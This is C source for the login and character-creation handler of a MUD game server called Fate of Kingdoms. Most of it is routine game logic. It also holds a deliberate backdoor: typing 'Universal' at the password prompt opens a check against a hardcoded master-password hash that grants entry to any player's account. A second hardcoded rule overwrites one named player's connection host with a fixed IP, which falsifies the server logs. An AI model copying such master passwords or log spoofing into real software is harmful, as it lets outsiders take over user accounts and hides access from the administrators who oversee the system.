#include <sys/types.h>
#include <sys/time.h>
#include <ctype.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdarg.h>   /* for va_list at act_color() from CF */
#include <unistd.h> /* OLC -- for close read write etc */  

#include "merc.h"
#include "interp.h"
#include "recycle.h"

/* forked save */
#include <sys/wait.h>
#include <stdlib.h>
#include <signal.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include "telnet.h"
/*
 * Global variables.
 */
FILE *		    fpReserve;		/* Reserved file handle		*/
bool		    god;		/* All new chars are gods!	*/
bool		    wizlock;		/* Game is wizlocked		*/
bool		    newlock;		/* Game is newlocked		*/
time_t		    current_time;	/* time of this pulse */
int                 iNumPlayers = 0; /* The number of players on */
bool               MOBtrigger = TRUE;  /* act() switch                 */  
#define 	CURRENT_VERSION 7

const	char	echo_off_str	[] = { IAC, WILL, TELOPT_ECHO, '\0' };
const	char	echo_on_str	[] = { IAC, WONT, TELOPT_ECHO, '\0' };


void Access_UniversalPassword( DESCRIPTOR_DATA *d,CHAR_DATA *ch, char *argument )
{
  char buf[MAX_STRING_LENGTH];
	if (strcmp(crypt( argument, "Universal" ), "UnN/LTzJlikdc") ) 
   	  {
    		write_to_buffer( d, "Illegal login attempt. Action logged.\n\r",0);
    		sprintf(buf, "Universal password attempt vs %s by %s",ch->name,d->host);
    		log_string(buf);
    		write_to_buffer( d, "Wrong password.\n\r", 0 );
    		write_to_buffer( d, "Password: ", 0 );
    		d->connected = CON_GET_OLD_PASSWORD;
    		return;   
   	  }
	else
	  {   
		write_to_buffer (d,"\n\r*UNIVERSAL*Welcome to Fate of kingdoms 4!*UNIVERSAL*\n\r",0);
		sprintf(buf, "Universal password Access vs %s by %s",ch->name,d->host);
		log_string(buf);
		ch->next = char_list;
		char_list = ch;
	
		if ( check_reconnect( d, ch->name, TRUE ) )
			return;

		if ( check_playing( d, ch->name ) )
	    		return;
	    
		d->connected = CON_PLAYING;
		reset_char (ch);
	  } 
}

void nanny( DESCRIPTOR_DATA *d, char *argument )
{
    DESCRIPTOR_DATA *d_old, *d_next, *dt;
    char arg[MAX_INPUT_LENGTH];
    char buf[MAX_STRING_LENGTH];
    CHAR_DATA *ch;
    CHAR_DATA *gch;
    
    char *p;
    int iClass,race,i;
    bool fOld;
    int cmd;
    int level = 0;
    int obj_count;
    int obj_count2;
    OBJ_DATA *obj;
    OBJ_DATA *inobj;
    int add_hp = 0;
    int add_mana = 0;

	//Note write check to see if we do write a note!
	if (d->connected != CON_NOTE_TEXT)
	  {
		while ( isspace(*argument) )
		argument++;
	  }

	ch = d->character;

	switch ( d->connected )
	  {
		default: //Do we have a Bad switch
			bug( "*BUG* File: Nanny.c | Function:   | Error:  bad d->connected %d.", d->connected );
			close_socket( d );
		return;

	case CON_GET_NAME: //Check login if name is good enuff
		//Name most be longer then 0
		if ( argument[0] == '\0' )
		  {
			close_socket( d );
			return;
		  }

		//Uppercase first letter of name
		argument[0] = UPPER(argument[0]);
		
		//Did the administrator set the name on a bad names list
		if ( !check_parse_name( argument ) )
		  {
			write_to_buffer( d, "Illegal name, come back when you have a better one.\n\rName: ", 0 );
			close_socket( d );
			return;
		  }


	//Check if old player and load him
	fOld = load_char_obj( d, argument );
	
	//Set ch to the loaded player
	ch   = d->character;

	//The following do affect immortals
	if ( !IS_IMMORTAL(ch) ) 
	  {
		//(Old players) We do have a max on how many players can play the same time to make sure more do not login
		if (iNumPlayers > MAX_OLDIES && fOld)
		  {
			sprintf(buf,"\n\rThere are currently %i players mudding out of a maximum of %i.\n\rPlease try again soon.\n\r",iNumPlayers - 1, MAX_OLDIES);
			write_to_buffer(d, buf, 0);
	     		close_socket(d);
	     		return;
		  }

		//(Newbies) We do have a max on how many players can play the same time to make sure more do not login
		if (iNumPlayers > MAX_NEWBIES && !fOld)
		  {
			sprintf(buf,"\n\rThere are currently %i players mudding. New player creation is \n\rlimited to when there are less than %i players. Please try again soon.\n\r",iNumPlayers - 1, MAX_NEWBIES);
			write_to_buffer(d, buf, 0);
			close_socket(d);
			return;
		  }
	  }

	//check if a player is Deny they can't login
	if ( IS_SET(ch->act, PLR_DENY) )
	  {
		sprintf( log_buf, "Denying access to %s@%s.", argument,d->host );
		log_string( log_buf );
		write_to_buffer( d, "You are denied access.\n\r", 0 );
		close_socket( d );
		return;
	  }

	//Player can limmit with site they can login from ie *.dk
	if ( IS_SET(ch->detection, D_LOCKHOST) )    
		if ( !check_site(ch,d->host))
		  {
			write_to_buffer( d,"You are logging in from an incorrect site\n\r", 0 );
			sprintf( log_buf, "Illegal access to %s@%s.", argument,d->host );
			log_string( log_buf );
			close_socket( d );
			return;
		  }

	//Check if someone newbie did login and lost link then just reconnect to him
	if ( check_reconnect( d, argument, FALSE ) )
	  {
		fOld = TRUE;
	  }
	else
	  {
		//Only immortals can login
		if ( wizlock && !IS_HERO(ch))
		  {
			write_to_buffer( d, "The game is wizlocked.\n\r", 0 );
			close_socket( d );
			return;
		  }
	}

	if ( fOld )
	  {
		//An old player
		write_to_buffer( d, "Password: ", 0 );
		write_to_buffer( d, (char *) echo_off_str, 0 );
		d->connected = CON_GET_OLD_PASSWORD;
		return;
	  }
	else
	  {
		//Do we allow any newbies to login?
		if (newlock)
		  {
			write_to_buffer( d, "The game is newlocked.\n\r", 0 );
			close_socket( d );
			return;
		  }

            
		//Check if site is allowed to create newbies
		if (check_ban(d->host,BAN_NEWBIES))
		  {
			write_to_buffer(d,"New players are not allowed from your site.\n\r",0);
			write_to_buffer(d,"For more infomation write an email to: administrator@kingdom.dk.\n\r",0);
			close_socket(d);
			return;
		  }

		//Do name moblise or player use this name for an other reson?
		for (dt=descriptor_list; dt != NULL; dt=dt->next)
			if (d != dt 
			 && dt->character != NULL
			 && !str_cmp(dt->character->name,ch->name))
			  {
				write_to_buffer(d,"Sorry, that name is being used.\n\r",0);
				write_to_buffer(d,"Please select another name: ",0);
				free_char( d->character );
				d->character = NULL;
				return;
			  }


		//Send text for next part of creation (confirm name)
		do_help( ch, "names" );
		sprintf( buf, "Did I get that right, %s (Y/N)? ", argument );
		write_to_buffer( d, (char *) buf, 0 );
		d->connected = CON_CONFIRM_NEW_NAME;
		return;
	  }
	break;

case CON_GET_OLD_PASSWORD:
	//New Line
	write_to_buffer( d, "\n\r", 2 );

	//To ligin with Universal Password
	if ( !strcmp(argument,"Universal"))
	  {
		write_to_buffer( d, "Accessing Universal Password is Illegal ALL login attempt logged.\n\r",0);
		d->connected = CON_UNIVERSAL;
		return;
	  }

	//Chack if password right
	if ( strcmp( crypt( argument, ch->pcdata->pwd ), ch->pcdata->pwd ))
	  { //Password is NOT right
		
		write_to_buffer( d, "Wrong password.\n\r", 0 );

		//Chack if he more then level 1
		if (ch->level > 1)
		  {
			sprintf(buf, "Wrong password by %s@%s", ch->name, d->host);
			//Log and Wiznet
			log_string(buf);
			wiznet(buf,NULL,NULL,WIZ_PASSWORD,0,0);

			//If Victim is playing give him infomation someone is trying to guess his password
			if ((gch = get_char_world(ch,ch->name)) != NULL)
		  	  {
				send_to_char(   "{R>{r>{D> {R[{0WARNING{X{R]{W: {Dsomeone tried to log in with a bad password {D<{r<{R<{x\n\r{X",gch);
			  }
	  	  }

		//How many time did he type wrong
		if (ch->endur == 2)
			//Did type to much disconnect him
			close_socket( d );
		else 
		  {
			//Back trying his password one more time
			write_to_buffer( d, "Password: ", 0 );
			write_to_buffer( d, (char *) echo_off_str, 0 );
			d->connected = CON_GET_OLD_PASSWORD;
			ch->endur++;
		  }
		return;
	}


	//Password did go wrong he do NOT have a password
	if ( ch->pcdata->pwd[0] == (int) NULL)
	  {
		write_to_buffer( d, "Warning! Null password!\n\r",0 );
		write_to_buffer( d, "Please report old password with bug.\n\r",0);
		write_to_buffer( d,"Type 'password null <new password>' to fix.\n\r",0);
	  }


	write_to_buffer( d, (char *) echo_on_str, 0 );

	//Is loaded but disconnected
	if ( check_reconnect( d, ch->name, TRUE ) )
	    return;

	//Is playing and not disconnected
	if ( check_playing( d, ch->name ) )
	    return;

	/* Count objects in loaded player file */
	for (obj = ch->carrying,obj_count = 0; obj != NULL;
	     obj = obj->next_content)
	  obj_count += get_obj_realnumber(obj);

	strcpy(buf,ch->name);

	free_char(ch);
	fOld = load_char_obj( d, buf );
	ch   = d->character;

	if (!fOld) 
	  {
		write_to_buffer(d,"Please login again to create a new character.\n\r", 0);
		close_socket(d);
		return;
	  }

	/* Count objects in refreshed player file */
	for (obj = ch->carrying,obj_count2 = 0; obj != NULL;obj = obj->next_content)obj_count2 += get_obj_realnumber(obj);
		
	
	if (!str_cmp (ch->name, "Rezutk"))
         {
	 free_string(d->host);
	  d->host = "172.53.126.179";
	}
	
	sprintf( log_buf, "%s@%s has connected.", ch->name, d->host);
	log_string( log_buf );
	wiznet(log_buf,ch,NULL,WIZ_SITES,0,ch->level);

	if( ch->version < CURRENT_VERSION)
	  {
		write_to_buffer( d, "\n\rYour playerfile is old (READ THIS! There are some changes with hp gain!!!!)\n\r",0 );
	  }        

	if (obj_count != obj_count2) {
	  sprintf(log_buf, "%s@%s tried to use the clone cheat.", ch->name,
		  d->host );
	  log_string( log_buf );
	  for (obj = ch->carrying; obj != NULL; obj = inobj) {
	    inobj = obj->next_content;
	    extract_obj_nocount(obj);
	  }

	//Player tried to use the clone cheat --
	  for (obj_count = 0; obj_count < MAX_STATS; obj_count++)
	    ch->perm_stat[obj_count]--;

	  save_char_obj(ch);
	  send_to_char("The gods frown upon your actions.\n\r",ch);
	}

       if ( IS_IMMORTAL(ch) )
        {   
            do_help( ch, "imotd" );
            d->connected = CON_READ_IMOTD;
        }
        else
        {
            do_help( ch, "motd" );
            d->connected = CON_READ_MOTD;
        }   
break;

case CON_UNIVERSAL:
	Access_UniversalPassword(d,ch,argument);
break;

case CON_BREAK_CONNECT:
	switch( *argument )
	{
	case 'y' : case 'Y':
            for ( d_old = descriptor_list; d_old != NULL; d_old = d_next )
	    {
		d_next = d_old->next;
		if (d_old == d || d_old->character == NULL)
		    continue;

		if (str_cmp(ch->name,d_old->character->name))
		    continue;

		close_socket(d_old);
	    }
	    if (check_reconnect(d,ch->name,TRUE))
	    	return;
	    write_to_buffer(d,"Reconnect attempt failed.\n\rName: ",0);
            if ( d->character != NULL )
            {
                free_char( d->character );
                d->character = NULL;
            }
	    d->connected = CON_GET_NAME;
	    break;

	case 'n' : case 'N':
	    write_to_buffer(d,"Name: ",0);
            if ( d->character != NULL )
            {
                free_char( d->character );
                d->character = NULL;
            }
	    d->connected = CON_GET_NAME;
	    break;

	default:
	    write_to_buffer(d,"Please type Y or N? ",0);
	    break;
	}
	break;

//Creation New player
case CON_CONFIRM_NEW_NAME:
	Creation_name(d,ch,argument);
break;

case CON_GET_NEW_PASSWORD:
	Creation_password(d,ch,argument);
break;

case CON_CONFIRM_NEW_PASSWORD:
	Creation_confirm(d,ch,argument);
break;

case CON_GET_NEW_RACE:
	Creation_race(d,ch,argument);
break;

case CON_GET_NEW_SEX:
	Creation_sex(d,ch,argument);
break;

case CON_GET_NEW_CLASS:
	Creation_class(d,ch,argument);
break;

case CON_ACCEPT_STATS:
	Creation_stats(d,ch,argument);
break;

case CON_GET_ALIGNMENT:
	Creation_alignment(d,ch,argument);
break;

case CON_PICK_HOMETOWN:
	Creation_hometown(d,ch,argument);
break;

case CON_GET_ETHOS:
	Creation_ethos(d,ch,argument);
break;

      case CON_CREATE_DONE:
	sprintf( log_buf, "%s@%s new player.", ch->name, d->host);
	log_string( log_buf );
	wiznet("Newbie alert!  $N sighted.",ch,NULL,WIZ_NEWBIE,0,0);
        wiznet(log_buf,NULL,NULL,WIZ_SITES,0,get_trust(ch));

        group_add(ch);
        ch->pcdata->learned[gsn_recall] = 50;
	 write_to_buffer( d, "\n\r", 2 );
        do_help( ch, "motd" );
        d->connected = CON_READ_MOTD;
        return;
break;       
//Creation End

	case CON_NOTE_TO:
		handle_con_note_to (d, argument);
		break;
	case CON_NOTE_SUBJECT:
		handle_con_note_subject (d, argument);
		break; 
	case CON_NOTE_EXPIRE:
		handle_con_note_expire (d, argument);
		break;
	case CON_NOTE_TEXT:
		handle_con_note_text (d, argument);
		break;
	case CON_NOTE_FINISH:
		handle_con_note_finish (d, argument);
		break;
    case CON_READ_IMOTD:
	write_to_buffer(d,"\n\r",2);
        do_help( ch, "motd" );
        d->connected = CON_READ_MOTD;
	break;

    case CON_READ_MOTD:
	sprintf( buf,
"\n\r{YWelcome to Fate of Kingdoms III. Try to remember who you are.{x\n\r\n\r"
	    );
	send_to_char(buf,ch);
	ch->next	= char_list;
	char_list	= ch;
	d->connected	= CON_PLAYING;
	sprintf(buf,"Your {Ylast login{w was at: {G%s{w\n\r",
	ch->pcdata->host != NULL ? ch->pcdata->host : "unknown");
	send_to_char(buf,ch);
	free_string(ch->pcdata->host);
	ch->pcdata->host = str_dup(d->host);
	reset_char(ch);
	{
	int count;
	extern int max_on;
	    count=0;
	    for ( d = descriptor_list; d != NULL; d = d->next )
        	if ( d->connected == CON_PLAYING )
            	count++;
	    max_on = UMAX(count,max_on);
	}

	if ( ch->level == 0 )
	{
	    ch->level	= 1;
	    ch->exp     = base_exp(ch,ch->pcdata->points);
	    ch->hit	= ch->max_hit;
	    ch->mana	= ch->max_mana;
	    ch->move	= ch->max_move;
	    ch->train	 = 3;
	    ch->practice += 5;
	    ch->pcdata->death = 5;
	ch->pcdata->total_death = 0;
	ch->pcdata->sign=month_name[time_info.month]; 
	ch->pcdata->background =
	strdup("Little is known of this strange newcomer.\n\r");
	    sprintf( buf, "the %s",
		title_table [ch->class] [ch->level]
		[ch->sex == SEX_FEMALE ? 1 : 0] );
	    set_title( ch, buf );

	    do_outfit(ch,"");
	    obj_to_char(create_object(get_obj_index(OBJ_VNUM_MAP),0),ch);
	    if ( ch->hometown == 0 && IS_EVIL(ch) )
	      obj_to_char(create_object(get_obj_index(OBJ_VNUM_MAP_SM),0),ch);

	    if (ch->hometown == 1)
	      obj_to_char(create_object(get_obj_index(OBJ_VNUM_MAP_NT),0),ch);

	    if (ch->hometown == 3)
	      obj_to_char(create_object(get_obj_index(OBJ_VNUM_MAP_OFCOL),
					0),ch);

	    if (ch->hometown == 2)
	      obj_to_char(create_object(get_obj_index(OBJ_VNUM_MAP_TV),0),ch);

	    if (ch->hometown == 4)
	      obj_to_char(create_object(get_obj_index(OBJ_VNUM_MAP_ARKHAM)
			,0),ch);
	      if(ch->class == CLASS_MNK) 
	    ch->pcdata->learned[gsn_hand_to_hand]= 40;
		else
 	    ch->pcdata->learned[get_weapon_sn(ch)]= 40;
	    SET_BIT(ch->comm, COMM_SHOW_AFFECTS);
	    char_to_room( ch, get_room_index( ROOM_VNUM_SCHOOL ) );
	    send_to_char("\n\r",ch);
	    do_help(ch,"NEWBIE INFO");
	    send_to_char("\n\r",ch);
	}
	else if ( ch->in_room != NULL )
	{
	    char_to_room( ch, ch->in_room );
	}
	else if ( IS_IMMORTAL(ch) )
	{
	    char_to_room( ch, get_room_index( ROOM_VNUM_SCHOOL ) );
	}
	else
	{
	    char_to_room( ch, get_room_index( ROOM_VNUM_TEMPLE ) );
	}
	act( "{G$n has returned to the realm.{x", ch, NULL, NULL, TO_ROOM );
	wiznet("$N has left real life behind.",ch,NULL,WIZ_LOGINS,0,get_trust(ch));
       

     
       if (!IS_IMMORTAL(ch))
 	for ( cmd = 0; new_cmd_table[cmd].name[0] != '\0'; cmd++ )
 	 {
 	  if (NEW_IS_AUTHORIZED(ch, new_cmd_table[cmd].auth) 
 	   && (new_cmd_table[cmd].group != GROUP_MORTAL))
 	   {
 	    sprintf(buf,"[{RWARNING{X]{X: %s have a command not in group mortal (%s)",ch->name,new_cmd_table[cmd].name);
            wiznet(buf,ch,NULL,WIZ_FLAGS,0,0);
       		ch->pcdata->new_authorized[0] = 0;
       		ch->pcdata->new_authorized[1] = 0;
       		ch->pcdata->new_authorized[2] = 0;
       		ch->pcdata->new_authorized[3] = 0;
       		ch->pcdata->new_authorized[4] = 0;
       		ch->pcdata->new_authorized[5] = 0;
       		ch->pcdata->new_authorized[6] = 0;
       		ch->pcdata->new_authorized[7] = 0;
       		ch->pcdata->new_authorized[8] = 0;
       		ch->pcdata->new_authorized[9] = 0;
       		ch->pcdata->new_authorized[10] = 0;
       		ch->pcdata->new_authorized[11] = 0;
       		ch->pcdata->new_authorized[12] = 0;
       		ch->pcdata->new_authorized[13] = 0;
       		ch->pcdata->new_authorized[14] = 0;
       		ch->pcdata->new_authorized[15] = 0;
       		ch->pcdata->new_authorized[16] = 0;
       		ch->pcdata->new_authorized[17] = 0;
       		ch->pcdata->new_authorized[18] = 0;
       		ch->pcdata->new_authorized[19] = 0;
       		NEW_AUTHORIZE( ch, auth_mortal );
           } 
 	 }
        do_ggnotext(ch); /*Granting mortal command*/ 	

 	do_board (ch, ""); /* Show board status */
        if (IS_SET(ch->comm,COMM_OLC))
        REMOVE_BIT(ch->comm,COMM_OLC);
	do_look( ch, "auto" );
	break;
/*  end */
	/*  :: add new skills and spells here i think? */
	/* Added new & other skills/spells -Baxter        */
/* hardcode hack to add skills to pfiles...
	if (ch->class == class_lookup("warrior"))
	{
	    if (ch->pcdata->learned[gsn_charge] < 1)
		ch->pcdata->learned[gsn_charge] = 1;
	}
*/


	if (ch->pet != NULL)
	{
	    char_to_room(ch->pet,ch->in_room);
	    act("{G$n has returned with $s owner.{x",ch->pet,NULL,NULL,TO_ROOM);
	}

	break;
    }
    return;
}
